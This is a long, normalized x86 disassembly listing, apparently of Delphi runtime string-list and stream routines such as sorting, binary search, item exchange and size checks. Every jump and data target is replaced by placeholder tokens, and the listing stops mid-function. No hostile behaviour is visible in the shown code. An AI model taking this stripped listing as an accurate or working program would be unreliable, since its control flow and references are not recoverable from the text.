mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419d43
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f50
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404210
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404470
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d4a
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_419d50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419dc8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dcf
lea eax [ ebp - 0xc ]
call sub_403f50
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_419ddc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419e9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404470
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a43c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404138
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c380
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ea6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_419eb0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_419ee4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419f14
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41afdc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f5c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f63
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_419f68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a005
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_419fe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41aac4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404040
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fef
mov eax [ ebp - 0x4 ]
call sub_419904
retn
sub_41a014
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a0b5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0bc
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_41a098
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419904
retn
sub_41a0c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a0fc
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41cd18
mov eax [ ebp - 0x4 ]
call sub_419848
xor eax eax
push ebp
push sub_41a17b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41bdb4
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d9b8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a182
mov eax [ ebp - 0x4 ]
call sub_419904
retn
sub_41a1ac
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41afdc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1fe
mov eax [ ebp - 0x4 ]
call sub_403154
retn
sub_41a204
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a251
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404210
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41ad28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a258
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41a264
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4057d4
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a298
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a2db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404148
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2e2
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41a2e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a39c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419848
xor edx edx
push ebp
push sub_41a37f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a386
mov eax [ ebp - 0x4 ]
call sub_419904
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404040
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a3ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a422
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ef4c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41ef54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a429
lea eax [ ebp - 0xc ]
call sub_403f50
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4206c0
inc esi
dec ebx
jne r-xdata
sub_41a454
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a470
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419680
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4049cc
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_41a4d8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4199fc
jmp r-xdata
sub_41a574
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4049cc
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a5b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ab8
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a620
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4199fc
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a67c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a67c
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a6a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a718
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403fa4
pop edi
pop esi
pop ebx
retn
sub_41a754
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a77c
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a7b0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_419d50
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a7fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4199fc
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a850
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a77c
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403fa4
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028d8
sub_41a8c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4199fc
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403fa4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a924
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a964
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a67c
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a964
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41aa14
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41aa70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a964
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41aac4
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41aaf8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41ab5c
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41abb0
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7a0
call sub_403908
mov esp ebp
pop ebp
retn
sub_41abfc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40309c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41abb0
pop ecx
mov eax [ ebx ]
call sub_4030e0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41abb0
pop ecx
sub_41ac80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41acf0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
sub_41ad28
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
sub_41ad60
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
